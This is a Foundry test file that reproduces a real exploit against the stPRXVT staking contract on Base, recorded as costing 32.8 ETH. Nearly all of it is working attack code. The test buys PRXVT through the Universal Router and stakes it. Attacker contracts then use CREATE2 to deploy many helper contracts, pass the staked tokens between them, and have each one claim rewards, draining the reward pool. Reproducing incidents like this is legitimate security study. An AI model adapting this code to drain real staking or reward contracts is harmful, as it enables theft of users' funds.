// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : 32.8ETH
// Attacker : https://basescan.org/address/0x7407f9bdc4140d5e284ea7de32a9de6037842f45
// Attack Contract : https://basescan.org/address/0x702980b1ed754c214b79192a4d7c39106f19bce9
// Vulnerable Contract : https://basescan.org/address/0xdac30a5e2612206e2756836ed6764ec5817e6fff
// Attack Tx : https://skylens.certik.com/tx/base/0xf42a8fe556d5e4ab59b0b7675ccbcd1425e7e2a6a8e0c9775fc6cd7c48ff55a1

interface IstPRXVT is IERC20 {
    function claimReward() external;
    function stake(uint256 amount) external;
    function earned(address account) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IUniversalRouter {
    function execute(
        bytes calldata commands,
        bytes[] calldata inputs
    ) external payable;
}


contract PrxvtExpTest is BaseTestWithBalanceLog {
    IERC20 constant PRXVT = IERC20(0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0);
    IstPRXVT constant stPRXVT = IstPRXVT(0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff);
    //address constant UNIVERSAL_ROUTER = 0x6fF5693b99212Da76ad316178A184AB56D299b43;
    address constant VIRTUAL = 0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b;
    address constant UNIVERSAL_ROUTER = 0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant QUOTER = 0x3d4e44Eb1374240CE5F1B871ab261CD16335B76a;

    uint24 constant POOL_FEE = 3000;
    address attacker = makeAddr("attacker");

    uint256 FORK_BLOCK = 40_229_653 - 1;

    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("base", FORK_BLOCK);
	// gas
        vm.deal(attacker, 2 ether);
    }

    function testExploit() public balanceLog {
	vm.startPrank(attacker);
        emit log_string("---- Exploit start ----");
	// 换取PRXVT
        /* ---------- 1. commands ---------- */
        bytes memory commands = abi.encodePacked(
            bytes1(0x0b), // WRAP_ETH
            bytes1(0x00), // V3_SWAP_EXACT_IN (WETH -> VIRTUAL)
            bytes1(0x08)  // V2_SWAP_EXACT_IN (VIRTUAL -> PRXVT)
        );

	bytes[] memory inputs = new bytes[](3);

        /* ---------- 1. WRAP_ETH ---------- */
        inputs[0] = abi.encode(
            address(0x0000000000000000000000000000000000000002), // recipient = router
            1 ether
        );
        
        /* ---------- 2. V3_SWAP_EXACT_IN : WETH -> VIRTUAL ---------- */
        bytes memory v3Path = abi.encodePacked(
            WETH,
            uint24(500),
            VIRTUAL
        );
        
        inputs[1] = abi.encode(
            address(0x0000000000000000000000000000000000000002), // recipient = router
            1 ether,
            uint256(0),
            v3Path,
            false // payerIsUser = false (use wrapped ETH)
        );
        
        /* ---------- 3. V2_SWAP_EXACT_IN : VIRTUAL -> PRXVT ---------- */
        address[] memory v2Path = new address[](2);
	v2Path[0] = VIRTUAL;
	v2Path[1] = address(PRXVT);
        
	// 1 eth购买VIRTUAL的数量
        uint256 virtualBal = 4599008521118671692028;

        inputs[2] = abi.encode(
            attacker,
            virtualBal,
            0,
            v2Path,
            false
        );

        /* ---------- 3. execute ---------- */
        IUniversalRouter(UNIVERSAL_ROUTER).execute{value: 1 ether}(
            commands,
            inputs
        );
        
	// 部署攻击合约
	Attack1 att1 = new Attack1(address(attacker), address(PRXVT), address(stPRXVT));

	// 授权PRXVT给攻击合约
	PRXVT.approve(address(att1), type(uint256).max);

	// 调用prepare函数
	att1.prepare(400_000 * 1e18);


	// 调用attack函数
	att1.attack(600_000);

	// 调用withdraw()函数
	att1.withdraw();
        uint256 prxvtBalance = PRXVT.balanceOf(attacker);
        uint256 stBalance = stPRXVT.balanceOf(attacker);
        emit log_named_uint("Final PRXVT balance of attacker", prxvtBalance/1e18);
        emit log_named_uint("Final stPRXVT balance of attacker", stBalance/1e18);
	vm.stopPrank();

        emit log_string("---- Exploit Finished ----");

    }

}

contract Attack1 {
    address public owner;
    IERC20 public PRXVT;
    IstPRXVT public stPRXVT;
    uint256 public totalClaimed;
    uint256 public attackCount;
    uint256 public nonce;

    constructor(address _owner, address _prxvt, address _stPrxvt) {
        owner = _owner;
        PRXVT = IERC20(_prxvt);
        stPRXVT = IstPRXVT(_stPrxvt);
    }

    function prepare(uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        
        // 1. 从EOA接收PRXVT
        PRXVT.transferFrom(msg.sender, address(this), amount);
        
        // 2. 授权给staking合约
        PRXVT.approve(address(stPRXVT), amount);
        
        // 3. 质押
        stPRXVT.stake(amount);
        
        console.log("Prepared: staked %s PRXVT", amount / 1e18);
    }

    // 攻击函数 0xe6d7db7e
    function attack(uint256 gasThreshold) external returns (uint256, uint256) {
        require(msg.sender == owner, "Not owner");
        
        uint256 i = 0;
        
        // 循环攻击直到gas低于阈值
        console.log("gasleft: %s ,gasThreshold: %s", gasleft(), gasThreshold);
        while (gasleft() > gasThreshold) {
        // while (i < 300) {
            _attack();
            i++;
            
            if (attackCount > 10) break; // 防止无限循环
        }
        console.log("gasleft: %s ,gasThreshold: %s", gasleft(), gasThreshold);
        
        console.log("Attack completed: %s iterations", i);
        return (totalClaimed, attackCount);
    }

    // 内部攻击函数
    function _attack() private {
        // 获取当前 stPRXVT 余额
        uint256 stBalance = stPRXVT.balanceOf(address(this));
        if (stBalance == 0) {
            return;
        }
        
        // 1. 使用 CREATE2 部署攻击辅助合约
        bytes memory bytecode = type(Attack2).creationCode;
        bytes32 salt = bytes32(nonce++);
        address att2;
        
        assembly {
            att2 := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
            if iszero(extcodesize(att2)) {
                revert(0, 0)
            }
        }
        
        // 2. 将所有 stPRXVT 转给辅助合约
        stPRXVT.transfer(att2, stBalance);
        
        // 3. 调用辅助合约执行攻击
        Attack2(att2).execute(
            address(stPRXVT),
            address(PRXVT),
            address(this)
        );
    }

    // 提取所有资金
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        
        uint256 prxvtBalance = PRXVT.balanceOf(address(this));
        uint256 stBalance = stPRXVT.balanceOf(address(this));
        
        // 提取 PRXVT
        if (prxvtBalance > 0) {
            PRXVT.transfer(owner, prxvtBalance);
        }
        
        // 提取 stPRXVT
        if (stBalance > 0) {
            stPRXVT.transfer(owner, stBalance);
        }
        console.log("Withdrawn: %s PRXVT, %s stPRXVT", prxvtBalance / 1e18, stBalance / 1e18);
    }

}

contract Attack2 {
    function execute(address stPrxvt, address prxvt, address attack1) public {
        require(msg.sender == attack1, "Not authorized");
        IERC20 PRXVT = IERC20(prxvt);
        IstPRXVT stPRXVT = IstPRXVT(stPrxvt);

        // 调用stPRXVT.earned
        uint256 earnedAmount = stPRXVT.earned(address(this));
        if (earnedAmount > 0) {
            stPRXVT.claimReward();
        }
        uint256 stBalance = stPRXVT.balanceOf(address(this));
        if (stBalance > 0) {
            stPRXVT.transfer(attack1, stBalance);
        }
        uint256 prxvtBalance = PRXVT.balanceOf(address(this));
        if (prxvtBalance > 0) {
            PRXVT.transfer(attack1, prxvtBalance);
        }
    }
}
